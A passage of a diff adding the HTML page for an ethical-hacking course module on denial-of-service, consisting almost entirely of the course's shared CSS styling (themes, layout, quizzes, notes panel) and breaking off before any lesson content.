@@ -1,0 +1,3003 @@
+<!DOCTYPE html>
+<html lang="en" data-module="dos" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CEH v13 Module 10: Denial-of-Service</title>
+<meta name="description" content="Volumetric, protocol, and application-layer attacks; botnet architecture; and the detection, rate-limiting, and scrubbing strategies used to absorb them.">
+<style>
+/* ============================================================
+   CEH v13 COURSE CHASSIS  v1.0
+   Shared design tokens + components for every module.
+   Edit here, regenerate all modules. Do not edit per-module.
+   ============================================================ */
+
+/* ---------- 1. TOKENS : DARK (default) ---------- */
+:root {
+  /* Brand: terminal green, used as ACCENT not body text */
+  --accent:          #35e05f;
+  --accent-strong:   #6dff96;
+  --accent-dim:      rgba(53, 224, 95, 0.14);
+  --accent-line:     rgba(53, 224, 95, 0.34);
+
+  --cyan:            #43d9d4;
+  --amber:           #f0b429;
+  --danger:          #ff6b6b;
+  --success:         #35e05f;
+
+  /* Surfaces */
+  --bg:              #07090b;
+  --bg-elev:         #0e1216;
+  --surface:         #141a20;
+  --surface-2:       #1b232b;
+  --border:          #26313b;
+  --border-strong:   #37444f;
+
+  /* Text — high legibility, green reserved for accents */
+  --text:            #e8eef2;
+  --text-muted:      #9fb0bd;
+  --text-faint:      #6f8291;
+  --text-on-accent:  #04120a;
+
+  /* Code */
+  --code-bg:         #05070a;
+  --code-text:       #8ef0a8;
+  --code-border:     #1e2a33;
+
+  /* Typography */
+  --font-scale:      1;
+  --font-body:       system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  --font-mono:       ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+
+  --fs-base:  calc(1rem     * var(--font-scale));
+  --fs-sm:    calc(0.875rem * var(--font-scale));
+  --fs-xs:    calc(0.78rem  * var(--font-scale));
+  --fs-lg:    calc(1.125rem * var(--font-scale));
+  --fs-h1:    calc(clamp(1.6rem, 1.1rem + 2.2vw, 2.6rem) * var(--font-scale));
+  --fs-h2:    calc(clamp(1.35rem, 1rem + 1.4vw, 1.9rem) * var(--font-scale));
+  --fs-h3:    calc(clamp(1.1rem, 0.95rem + 0.6vw, 1.3rem) * var(--font-scale));
+  --fs-h4:    calc(1.02rem * var(--font-scale));
+
+  /* Space + shape */
+  --sp-1: 0.35rem; --sp-2: 0.6rem;  --sp-3: 0.9rem;
+  --sp-4: 1.3rem;  --sp-5: 1.9rem;  --sp-6: 2.6rem;
+  --radius:    10px;
+  --radius-lg: 16px;
+  --shadow:    0 2px 10px rgba(0,0,0,.42);
+  --shadow-lg: 0 10px 34px rgba(0,0,0,.5);
+  --ring:      0 0 0 3px rgba(53,224,95,.42);
+  --maxw:      1180px;
+}
+
+/* ---------- 2. TOKENS : LIGHT ---------- */
+[data-theme="light"] {
+  --accent:          #0f7a34;
+  --accent-strong:   #0a5c26;
+  --accent-dim:      rgba(15, 122, 52, 0.10);
+  --accent-line:     rgba(15, 122, 52, 0.30);
+
+  --cyan:            #0b6d78;
+  --amber:           #8a5a00;
+  --danger:          #b3261e;
+  --success:         #0f7a34;
+
+  --bg:              #f4f6f8;
+  --bg-elev:         #ffffff;
+  --surface:         #ffffff;
+  --surface-2:       #eef2f5;
+  --border:          #d3dbe2;
+  --border-strong:   #b4c0ca;
+
+  --text:            #10181f;
+  --text-muted:      #48586a;
+  --text-faint:      #6b7c8c;
+  --text-on-accent:  #ffffff;
+
+  --code-bg:         #10181f;
+  --code-text:       #a6f0be;
+  --code-border:     #26313b;
+
+  --shadow:    0 1px 3px rgba(16,24,31,.10);
+  --shadow-lg: 0 10px 30px rgba(16,24,31,.14);
+  --ring:      0 0 0 3px rgba(15,122,52,.34);
+}
+
+/* ---------- 2b. LEGACY ALIASES ----------
+   Pre-chassis modules referenced these names in inline styles and in JS
+   template literals. They are mapped onto the token system so inherited
+   markup stays theme-aware. Do not use them in new content. */
+:root, [data-theme="light"] {
+  --primary-color:   var(--accent);
+  --secondary-color: var(--cyan);
+  --accent-color:    var(--accent);
+  --success-color:   var(--success);
+  --warning-color:   var(--amber);
+  --danger-color:    var(--danger);
+  --error-color:     var(--danger);
+  --text-light:      var(--text-muted);
+  --text-dark:       var(--text);
+  --border-color:    var(--border);
+  --dark-bg:         var(--bg);
+  --card-bg:         var(--surface);
+  --light-bg:        var(--surface-2);
+
+  /* module-scoped legacy names */
+  --sniff-primary:   var(--accent);
+  --sniff-secondary: var(--cyan);
+}
+
+/* ---------- 3. RESET + BASE ---------- */
+*, *::before, *::after { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; scroll-behavior: smooth; }
+
+body {
+  margin: 0;
+  font-family: var(--font-body);
+  font-size: var(--fs-base);
+  line-height: 1.65;
+  color: var(--text);
+  background: var(--bg);
+  overflow-x: hidden;
+}
+
+h1, h2, h3, h4 { line-height: 1.25; margin: 0 0 var(--sp-3); font-weight: 700; }
+h1 { font-size: var(--fs-h1); }
+h2 { font-size: var(--fs-h2); }
+h3 { font-size: var(--fs-h3); color: var(--accent); }
+h4 { font-size: var(--fs-h4); color: var(--accent); }
+p  { margin: 0 0 var(--sp-3); }
+ul, ol { margin: 0 0 var(--sp-3); padding-left: 1.35rem; }
+li { margin-bottom: var(--sp-1); }
+strong { color: var(--text); font-weight: 700; }
+a { color: var(--accent); text-underline-offset: 3px; }
+a:hover { color: var(--accent-strong); }
+
+:focus-visible {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+  box-shadow: var(--ring);
+  border-radius: 4px;
+}
+
+.skip-link {
+  position: absolute; left: -9999px; top: 0; z-index: 999;
+  background: var(--accent); color: var(--text-on-accent);
+  padding: var(--sp-2) var(--sp-4); border-radius: 0 0 var(--radius) 0;
+  font-weight: 700; text-decoration: none;
+}
+.skip-link:focus { left: 0; }
+
+.visually-hidden {
+  position: absolute !important; width: 1px; height: 1px;
+  padding: 0; margin: -1px; overflow: hidden;
+  clip: rect(0 0 0 0); white-space: nowrap; border: 0;
+}
+
+/* ---------- 4. AMBIENT BACKDROP ---------- */
+.matrix-bg {
+  position: fixed; inset: 0; z-index: -1; pointer-events: none;
+  background:
+    radial-gradient(circle at 18% 24%, var(--accent-dim) 0%, transparent 42%),
+    radial-gradient(circle at 82% 72%, var(--accent-dim) 0%, transparent 46%);
+  opacity: .85;
+}
+[data-theme="light"] .matrix-bg { opacity: .5; }
+
+.matrix-line {
+  position: absolute; color: var(--accent); font-family: var(--font-mono);
+  font-size: 12px; opacity: .18; animation: matrix-fall 9s linear infinite;
+}
+@keyframes matrix-fall {
+  from { transform: translateY(-110vh); }
+  to   { transform: translateY(110vh); }
+}
+
+/* ---------- 5. LAYOUT ---------- */
+.container { max-width: var(--maxw); margin: 0 auto; padding: var(--sp-4); }
+
+/* ---------- 6. CONTROL BAR ---------- */
+.controlbar {
+  position: sticky; top: 0; z-index: 60;
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  padding: var(--sp-2) var(--sp-3);
+  background: color-mix(in srgb, var(--bg-elev) 92%, transparent);
+  border-bottom: 1px solid var(--border);
+  backdrop-filter: blur(10px);
+}
+.controlbar__brand {
+  font-family: var(--font-mono); font-size: var(--fs-xs);
+  color: var(--accent); letter-spacing: .09em; text-transform: uppercase;
+  font-weight: 700; margin-right: auto; white-space: nowrap;
+}
+.controlbar__group {
+  display: flex; align-items: center; gap: 4px;
+  border: 1px solid var(--border); border-radius: 999px;
+  padding: 3px; background: var(--surface);
+}
+.controlbar__label {
+  font-size: var(--fs-xs); color: var(--text-muted);
+  padding: 0 var(--sp-1); white-space: nowrap;
+}
+
+.ctl {
+  min-height: 38px; min-width: 38px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  padding: 0 var(--sp-2);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: transparent;
+  border: 0; border-radius: 999px; cursor: pointer;
+  transition: background .15s, color .15s;
+}
+.ctl:hover  { background: var(--surface-2); color: var(--text); }
+.ctl[aria-pressed="true"], .ctl.is-active {
+  background: var(--accent); color: var(--text-on-accent);
+}
+.ctl:disabled { opacity: .4; cursor: not-allowed; }
+
+/* ---------- 7. HEADER ---------- */
+.header {
+  text-align: center; margin: var(--sp-5) 0 var(--sp-4);
+  padding: var(--sp-5) var(--sp-4);
+  background: var(--bg-elev);
+  border: 1px solid var(--border);
+  border-top: 3px solid var(--accent);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+}
+.header h1 { color: var(--text); margin-bottom: var(--sp-3); }
+.module-info { color: var(--text-muted); max-width: 70ch; margin: 0 auto; }
+.module-info h3 { color: var(--accent); }
+
+.highlight {
+  display: inline-block;
+  background: var(--accent-dim); color: var(--accent);
+  border: 1px solid var(--accent-line);
+  padding: 2px 10px; margin: 3px; border-radius: 999px;
+  font-size: var(--fs-xs); font-weight: 600; white-space: nowrap;
+}
+
+/* ---------- 8. NAV (tablist) ---------- */
+.navigation {
+  display: flex; flex-wrap: wrap; gap: var(--sp-2);
+  margin-bottom: var(--sp-4);
+  padding: var(--sp-2);
+  background: var(--bg-elev);
+  border: 1px solid var(--border); border-radius: var(--radius-lg);
+}
+.nav-btn {
+  flex: 1 1 auto; min-height: 44px;
+  padding: var(--sp-2) var(--sp-3);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer; white-space: nowrap;
+  transition: background .15s, color .15s, border-color .15s;
+}
+.nav-btn:hover { color: var(--text); border-color: var(--border-strong); }
+.nav-btn[aria-selected="true"], .nav-btn.active {
+  background: var(--accent); color: var(--text-on-accent);
+  border-color: var(--accent);
+}
+.nav-btn__done { color: var(--accent); font-weight: 700; }
+.nav-btn[aria-selected="true"] .nav-btn__done { color: var(--text-on-accent); }
+
+/* ---------- 9. PROGRESS ---------- */
+.progress-wrap {
+  display: flex; align-items: center; gap: var(--sp-3);
+  margin-bottom: var(--sp-4);
+}
+.progress-bar {
+  flex: 1; height: 8px; overflow: hidden;
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: 999px;
+}
+.progress-fill {
+  height: 100%; width: 0;
+  background: linear-gradient(90deg, var(--accent), var(--cyan));
+  border-radius: 999px; transition: width .35s ease;
+}
+.progress-text {
+  font-family: var(--font-mono); font-size: var(--fs-xs);
+  color: var(--text-muted); white-space: nowrap;
+}
+
+/* ---------- 10. SECTIONS ---------- */
+.module-section { display: none; animation: fade-in .28s ease; }
+.module-section.active { display: block; }
+@keyframes fade-in { from { opacity: 0; transform: translateY(8px);} to {opacity:1;transform:none;} }
+
+.section-title {
+  color: var(--text);
+  padding-bottom: var(--sp-2); margin-bottom: var(--sp-4);
+  border-bottom: 2px solid var(--accent-line);
+}
+.subsection {
+  margin: var(--sp-4) 0; padding-left: var(--sp-3);
+  border-left: 3px solid var(--accent-line);
+}
+
+/* ---------- 11. CARDS ---------- */
+.card, .feature-card, .tool-card, .tool-showcase, .interactive-demo, .lab-simulator {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: var(--sp-4);
+  margin-bottom: var(--sp-4);
+  box-shadow: var(--shadow);
+}
+.feature-card, .tool-card { margin-bottom: 0; height: 100%; }
+.interactive-demo, .lab-simulator { border-left: 3px solid var(--accent); }
+
+.grid-2, .grid-3 { display: grid; gap: var(--sp-4); margin-bottom: var(--sp-4); }
+.grid-2 { grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr)); }
+.grid-3 { grid-template-columns: repeat(auto-fit, minmax(min(100%, 250px), 1fr)); }
+
+/* ---------- 12. CODE + TERMINAL ---------- */
+.code-block, .terminal, .demo-output {
+  font-family: var(--font-mono);
+  font-size: var(--fs-sm);
+  line-height: 1.6;
+  background: var(--code-bg);
+  color: var(--code-text);
+  border: 1px solid var(--code-border);
+  border-radius: var(--radius);
+  padding: var(--sp-3);
+  margin: var(--sp-3) 0;
+  overflow-x: auto;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.demo-output { min-height: 60px; color: var(--text); }
+.demo-output:empty::before {
+  content: "Output appears here after you run the demo.";
+  color: var(--text-faint); font-style: italic;
+}
+.demo-controls { display: flex; flex-wrap: wrap; gap: var(--sp-2); margin: var(--sp-3) 0; }
+
+/* ---------- 13. BUTTONS ---------- */
+.btn {
+  min-height: 44px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  padding: var(--sp-2) var(--sp-4);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border: 1px solid var(--accent); border-radius: var(--radius);
+  cursor: pointer; text-decoration: none;
+  transition: filter .15s, transform .08s;
+}
+.btn:hover { filter: brightness(1.12); }
+.btn:active { transform: translateY(1px); }
+.btn-success { background: var(--success); border-color: var(--success); }
+.btn-warning { background: var(--amber);  border-color: var(--amber);  color: var(--text-on-accent); }
+.btn-danger  { background: var(--danger); border-color: var(--danger); color: #fff; }
+[data-theme="light"] .btn-warning { color: #fff; }
+
+/* ---------- 14. FLOW DIAGRAM ---------- */
+.attack-flow {
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  margin: var(--sp-4) 0;
+}
+.flow-step {
+  flex: 1 1 150px; min-width: 130px; text-align: center;
+  padding: var(--sp-3);
+  font-size: var(--fs-sm); font-weight: 600;
+  background: var(--accent-dim); color: var(--text);
+  border: 1px solid var(--accent-line); border-radius: var(--radius);
+}
+.flow-arrow { color: var(--accent); font-size: var(--fs-lg); font-weight: 700; }
+
+/* ---------- 15. QUIZ ---------- */
+.quiz-container { background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: var(--sp-4); }
+.quiz-question { margin-bottom: var(--sp-4); }
+.quiz-options { display: grid; gap: var(--sp-2); margin: var(--sp-3) 0; list-style: none; padding: 0; }
+.quiz-option {
+  width: 100%; min-height: 44px; text-align: left;
+  padding: var(--sp-3);
+  font: inherit; font-size: var(--fs-base); color: var(--text);
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer; transition: border-color .15s, background .15s;
+}
+.quiz-option:hover { border-color: var(--accent); }
+.quiz-option.selected { border-color: var(--accent); background: var(--accent-dim); }
+.quiz-option.correct::after   { content: "  ✓ Correct"; color: var(--success); font-weight: 700; }
+.quiz-option.incorrect::after { content: "  ✕ Incorrect"; color: var(--danger); font-weight: 700; }
+.quiz-option.correct   { border-color: var(--success); background: color-mix(in srgb, var(--success) 14%, transparent); }
+.quiz-option.incorrect { border-color: var(--danger);  background: color-mix(in srgb, var(--danger) 14%, transparent); }
+.quiz-navigation { display: flex; flex-wrap: wrap; gap: var(--sp-2); justify-content: space-between; margin-top: var(--sp-4); }
+
+/* ---------- 16. RESOURCES ---------- */
+.resource-link {
+  display: inline-block; margin: 3px 0;
+  color: var(--accent); text-decoration: none; font-weight: 500;
+}
+.resource-link:hover { text-decoration: underline; }
+.resource-link[target="_blank"]::after { content: " ↗"; font-size: .85em; color: var(--text-faint); }
+
+/* ---------- 17. MODAL ---------- */
+.modal {
+  display: none; position: fixed; inset: 0; z-index: 100;
+  background: rgba(0,0,0,.72);
+  padding: var(--sp-4);
+  overflow-y: auto;
+}
+.modal.open { display: flex; align-items: flex-start; justify-content: center; }
+.modal-content {
+  position: relative;
+  width: 100%; max-width: 760px; margin: auto;
+  background: var(--bg-elev); color: var(--text);
+  border: 1px solid var(--border-strong); border-radius: var(--radius-lg);
+  padding: var(--sp-5); box-shadow: var(--shadow-lg);
+}
+.close {
+  position: absolute; top: var(--sp-2); right: var(--sp-2);
+  min-width: 44px; min-height: 44px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.6rem; line-height: 1;
+  color: var(--text-muted); background: transparent;
+  border: 0; border-radius: var(--radius); cursor: pointer;
+}
+.close:hover { color: var(--danger); background: var(--surface-2); }
+
+/* ---------- 18. NOTIFICATION ---------- */
+.notification {
+  position: fixed; right: var(--sp-4); bottom: var(--sp-4); z-index: 120;
+  max-width: min(92vw, 360px);
+  padding: var(--sp-3) var(--sp-4);
+  font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border-radius: var(--radius); box-shadow: var(--shadow-lg);
+  opacity: 0; transform: translateY(14px); pointer-events: none;
+  transition: opacity .25s, transform .25s;
+}
+.notification.show { opacity: 1; transform: none; }
+.notification.error   { background: var(--danger); color: #fff; }
+.notification.warning { background: var(--amber); }
+
+/* ---------- 18a. GLOSSARY TOOLTIPS ---------- */
+.term {
+  border-bottom: 1px dotted var(--accent);
+  cursor: help;
+  color: inherit;
+  transition: background-color .12s ease, color .12s ease;
+  border-radius: 2px;
+}
+.term:hover,
+.term:focus-visible {
+  background: var(--accent-dim);
+  color: var(--accent);
+  outline: none;
+}
+.term:focus-visible { box-shadow: 0 0 0 2px var(--ring); }
+
+.tooltip-bubble {
+  position: absolute;
+  z-index: 1200;
+  max-width: min(320px, 86vw);
+  padding: var(--sp-2) var(--sp-3);
+  background: var(--surface);
+  color: var(--text);
+  border: 1px solid var(--border-strong);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow-lg);
+  font-size: var(--fs-sm);
+  line-height: 1.5;
+  opacity: 0;
+  transform: translateY(2px);
+  transition: opacity .14s ease, transform .14s ease;
+  pointer-events: none;
+}
+.tooltip-bubble.is-visible { opacity: 1; transform: none; }
+.tooltip-bubble::after {
+  content: "";
+  position: absolute;
+  left: var(--tip-arrow, 50%);
+  width: 9px; height: 9px;
+  background: var(--surface);
+  border: 1px solid var(--border-strong);
+  transform: translateX(-50%) rotate(45deg);
+}
+.tooltip-bubble[data-placement="top"]::after {
+  bottom: -5px; border-top: none; border-left: none;
+}
+.tooltip-bubble[data-placement="bottom"]::after {
+  top: -5px; border-bottom: none; border-right: none;
+}
+
+/* cross-module reference links */
+a.xref {
+  color: var(--accent);
+  text-decoration: none;
+  border-bottom: 1px solid var(--accent-line);
+  white-space: nowrap;
+}
+a.xref:hover, a.xref:focus-visible { border-bottom-color: var(--accent); background: var(--accent-dim); border-radius: 2px; }
+
+/* ---------- 18b. COURSE NAV ---------- */
+.course-nav {
+  display: flex; flex-wrap: wrap; gap: var(--sp-2);
+  align-items: center; justify-content: space-between;
+  margin-top: var(--sp-5); padding-top: var(--sp-4);
+  border-top: 1px solid var(--border);
+}
+.course-nav a {
+  min-height: 44px;
+  display: inline-flex; align-items: center; gap: 8px;
+  padding: var(--sp-2) var(--sp-4);
+  font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  text-decoration: none;
+}
+.course-nav a:hover { border-color: var(--accent); color: var(--accent); }
+.course-nav .is-home { margin-inline-start: auto; }
+.course-nav .is-aux {
+  font-weight: 500; color: var(--text-muted);
+  background: transparent; border-color: var(--border);
+}
+.course-nav .is-aux:last-of-type { margin-inline-end: auto; }
+.course-nav .is-aux:hover { color: var(--accent); border-color: var(--accent); }
+.course-nav .is-disabled { opacity: .4; pointer-events: none; }
+
+/* ---------- 18c. LEGACY COMPONENTS ----------
+   Class names inherited from the pre-chassis modules. The old per-module
+   stylesheets are gone, so these are mapped onto the token system here.
+   New content should use .card / .grid-2 / .grid-3 / .terminal instead. */
+
+/* card family */
+.ai-tool-card, .analysis-card, .assessment-card, .attack-card, .aws-card,
+.azure-card, .cia-element, .cloud-card, .database-card, .enum-card,
+.gcp-card, .hacker-card, .kill-chain-step, .lab-card, .lab-exercise,
+.lab-scenario, .legal-card, .malware-card, .mitre-tactic, .objective-card,
+.resource-card, .technique-card, .timeline-item, .vulnerability-card,
+.webapp-card, .certification-preview, .lab-environment,
+.static-analysis, .dynamic-analysis {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: var(--sp-4);
+  margin-bottom: var(--sp-3);
+}
+.kill-chain-step, .mitre-tactic, .timeline-item { border-left: 3px solid var(--accent); }
+.lab-exercise, .lab-scenario, .lab-card { border-left: 3px solid var(--cyan); }
+
+/* attacker-hat cards keep a semantic edge colour */
+.white-hat { border-left: 4px solid var(--success); }
+.gray-hat  { border-left: 4px solid var(--amber); }
+.black-hat { border-left: 4px solid var(--danger); }
+
+/* grid family */
+.ai-tools-grid, .assessment-grid, .attack-grid, .cia-triad, .cloud-providers,
+.database-services, .enum-types, .hacker-types, .kill-chain, .labs-container,
+.legal-framework, .malware-grid, .mitre-matrix, .resources-grid,
+.stats-container, .technique-grid, .tool-grid, .tool-mastery-grid,
+.tools-grid, .vulnerability-grid, .webapp-techniques, .timeline,
+.analysis-comparison, .completion-stats {
+  display: grid;
+  gap: var(--sp-3);
+  grid-template-columns: repeat(auto-fit, minmax(min(100%, 260px), 1fr));
+  margin-bottom: var(--sp-4);
+}
+.timeline, .lab-container { grid-template-columns: 1fr; }
+
+.lab-header {
+  display: flex; flex-wrap: wrap; align-items: center; gap: var(--sp-2);
+  justify-content: space-between; margin-bottom: var(--sp-3);
+}
+.lab-objectives, .lab-steps, .step-list { margin: var(--sp-2) 0 var(--sp-3) 1.2rem; }
+
+/* terminal output lines */
+.terminal-line { display: block; font-family: var(--font-mono); font-size: var(--fs-sm); }
+.terminal-line.prompt,  .terminal-line .prompt  { color: var(--accent); }
+.terminal-line.output,  .terminal-line .output  { color: var(--text); }
+.terminal-line.info,    .terminal-line .info    { color: var(--cyan); }
+.terminal-line.success, .terminal-line .success { color: var(--success); }
+.terminal-line.warning, .terminal-line .warning { color: var(--amber); }
+.terminal-line.error,   .terminal-line .error   { color: var(--danger); }
+.azure-output, .gcp-output {
+  font-family: var(--font-mono); font-size: var(--fs-sm);
+  background: var(--code-bg); color: var(--code-text);
+  border: 1px solid var(--code-border); border-radius: var(--radius);
+  padding: var(--sp-3); margin: var(--sp-2) 0; overflow-x: auto; white-space: pre-wrap;
+}
+
+/* callout boxes */
+.info-box, .success-box, .warning-box {
+  padding: var(--sp-3) var(--sp-4); margin: var(--sp-3) 0;
+  border: 1px solid var(--border); border-left-width: 4px;
+  border-radius: var(--radius); background: var(--surface-2);
+}
+.info-box    { border-left-color: var(--cyan); }
+.success-box { border-left-color: var(--success); }
+.warning-box { border-left-color: var(--amber); }
+
+/* CVSS severity */
+.cvss-score {
+  display: inline-block; padding: 2px 12px; border-radius: 999px;
+  font-family: var(--font-mono); font-weight: 700; font-size: var(--fs-sm);
+  background: var(--surface-2); border: 1px solid var(--border);
+}
+.cvss-none     { color: var(--text-muted); }
+.cvss-low      { color: var(--success); border-color: var(--success); }
+.cvss-medium   { color: var(--amber);   border-color: var(--amber); }
+.cvss-high     { color: var(--danger);  border-color: var(--danger); }
+.cvss-critical { color: var(--text-on-accent); background: var(--danger); border-color: var(--danger); }
+
+/* quiz-option aliases used by some modules */
+.option {
+  display: block; width: 100%; text-align: left; min-height: 44px;
+  padding: var(--sp-3); margin-bottom: var(--sp-2);
+  font: inherit; color: var(--text);
+  background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius);
+  cursor: pointer;
+}
+.option:hover { border-color: var(--accent); }
+.option.selected { border-color: var(--accent); background: var(--accent-dim); }
+.option.correct   { border-color: var(--success); background: color-mix(in srgb, var(--success) 14%, transparent); }
+.option.incorrect { border-color: var(--danger);  background: color-mix(in srgb, var(--danger) 14%, transparent); }
+.options { list-style: none; padding: 0; margin: var(--sp-3) 0; }
+.question { margin-bottom: var(--sp-4); }
+
+/* misc */
+.btn-secondary { background: var(--surface-2); color: var(--text); border-color: var(--border-strong); }
+.btn-lab, .lab-btn {
+  min-height: 44px; display: inline-flex; align-items: center; gap: 6px;
+  padding: var(--sp-2) var(--sp-4); font: inherit; font-weight: 600;
+  color: var(--text-on-accent); background: var(--cyan);
+  border: 1px solid var(--cyan); border-radius: var(--radius); cursor: pointer;
+}
+.tool-icon, .enum-icon { font-size: calc(1.6rem * var(--font-scale)); line-height: 1; }
+.score-display {
+  font-family: var(--font-mono); font-size: calc(2.4rem * var(--font-scale));
+  font-weight: 700; color: var(--accent); text-align: center;
+}
+.stat-number {
+  font-family: var(--font-mono); font-size: calc(1.7rem * var(--font-scale));
+  font-weight: 700; color: var(--accent); line-height: 1.1;
+}
+.completion-badge, .certification-badge {
+  display: inline-block; padding: var(--sp-2) var(--sp-4);
+  font-weight: 700; color: var(--text-on-accent);
+  background: var(--accent); border-radius: 999px;
+}
+.certification-section { margin-top: var(--sp-5); }
+.stat-card {
+  text-align: center; padding: var(--sp-4);
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+}
+.module-section .footer, main .footer {
+  margin-top: var(--sp-5); padding-top: var(--sp-4);
+  border-top: 1px solid var(--border);
+  font-size: var(--fs-xs); color: var(--text-faint); text-align: center;
+}
+.pulse { animation: pulse 2s ease-in-out infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .55; } }
+
+/* ---------- 18d. NOTES ---------- */
+.notes-fab {
+  position: fixed; right: var(--sp-4); bottom: var(--sp-4); z-index: 90;
+  min-width: 56px; min-height: 56px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  padding: 0 var(--sp-4);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-on-accent); background: var(--accent);
+  border: none; border-radius: 999px; cursor: pointer;
+  box-shadow: var(--shadow-lg);
+  transition: filter .15s, transform .1s;
+}
+.notes-fab:hover { filter: brightness(1.1); }
+.notes-fab:active { transform: translateY(1px); }
+.notes-fab__icon { font-size: 1.3rem; line-height: 1; }
+.notes-fab__dot {
+  position: absolute; top: 6px; right: 8px;
+  width: 11px; height: 11px; border-radius: 50%;
+  background: var(--amber); border: 2px solid var(--bg);
+}
+
+.notes-panel {
+  position: fixed; right: var(--sp-4); bottom: calc(var(--sp-4) + 68px);
+  z-index: 95;
+  width: min(94vw, 420px); max-height: min(72vh, 560px);
+  display: none; flex-direction: column;
+  background: var(--bg-elev);
+  border: 1px solid var(--border-strong); border-radius: var(--radius-lg);
+  box-shadow: var(--shadow-lg);
+  overflow: hidden;
+}
+.notes-panel.open { display: flex; animation: fade-in .2s ease; }
+
+.notes-panel__head {
+  display: flex; align-items: center; gap: var(--sp-2);
+  padding: var(--sp-3);
+  border-bottom: 1px solid var(--border);
+}
+.notes-panel__title { font-weight: 700; font-size: var(--fs-base); margin-right: auto; }
+.notes-panel__close {
+  min-width: 36px; min-height: 36px; display: flex; align-items: center; justify-content: center;
+  font-size: 1.4rem; line-height: 1; color: var(--text-muted);
+  background: transparent; border: 0; border-radius: var(--radius); cursor: pointer;
+}
+.notes-panel__close:hover { color: var(--danger); background: var(--surface-2); }
+
+.notes-tabs { display: flex; gap: 4px; padding: var(--sp-2) var(--sp-3) 0; }
+.notes-tab {
+  flex: 1; min-height: 38px; padding: var(--sp-1) var(--sp-2);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text-muted); background: var(--surface);
+  border: 1px solid var(--border); border-bottom: none;
+  border-radius: var(--radius) var(--radius) 0 0; cursor: pointer;
+}
+.notes-tab[aria-pressed="true"] { color: var(--accent); background: var(--surface-2); border-color: var(--border-strong); }
+
+.notes-panel__scope {
+  font-size: var(--fs-xs); color: var(--text-faint);
+  padding: var(--sp-2) var(--sp-3) 0;
+}
+.notes-panel__body { padding: var(--sp-2) var(--sp-3); flex: 1; min-height: 0; display: flex; }
+.notes-area {
+  width: 100%; min-height: 180px; resize: vertical;
+  padding: var(--sp-3);
+  font: inherit; font-size: var(--fs-base); line-height: 1.55;
+  color: var(--text); background: var(--surface);
+  border: 1px solid var(--border); border-radius: var(--radius);
+}
+.notes-area:focus-visible { border-color: var(--accent); }
+
+.notes-panel__foot {
+  display: flex; gap: var(--sp-2); align-items: center;
+  padding: var(--sp-2) var(--sp-3) var(--sp-3);
+}
+.notes-panel__foot .notes-hint { font-size: var(--fs-xs); color: var(--text-faint); margin-right: auto; }
+.notes-mini {
+  min-height: 36px; padding: 0 var(--sp-3);
+  font: inherit; font-size: var(--fs-sm); font-weight: 600;
+  color: var(--text); background: var(--surface-2);
+  border: 1px solid var(--border); border-radius: var(--radius); cursor: pointer;
+}
+.notes-mini:hover { border-color: var(--accent); color: var(--accent); }
+.notes-mini.is-danger:hover { border-color: var(--danger); color: var(--danger); }
+
+@media (max-width: 720px) {
+  .notes-panel { right: 3vw; left: 3vw; width: auto; bottom: calc(var(--sp-3) + 64px); }
+  .notes-fab { right: var(--sp-3); bottom: var(--sp-3); }
+  .notes-fab__text { display: none; }
+}
+
+/* ---------- 19. FOOTER ---------- */
+.module-footer {
+  margin-top: var(--sp-6); padding: var(--sp-4) 0;
+  border-top: 1px solid var(--border);
+  font-size: var(--fs-xs); color: var(--text-faint); text-align: center;
+}
+.module-footer .legal {
+  max-width: 70ch; margin: 0 auto var(--sp-2);
+}
+
+/* ---------- 20. MOTION ---------- */
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: .001ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: .001ms !important;
+    scroll-behavior: auto !important;
+  }
+  .matrix-line { display: none; }
+}
+
+/* ---------- 21. RESPONSIVE ---------- */
+@media (max-width: 720px) {
+  .container { padding: var(--sp-3); }
+  .header { padding: var(--sp-4) var(--sp-3); }
+  .nav-btn { flex: 1 1 100%; }
+  .controlbar__brand { flex: 1 1 100%; margin-bottom: 4px; }
+  .attack-flow { flex-direction: column; }
+  .flow-arrow { transform: rotate(90deg); }
+}
+
+/* ---------- 22. PRINT ---------- */
+@media print {
+  :root {
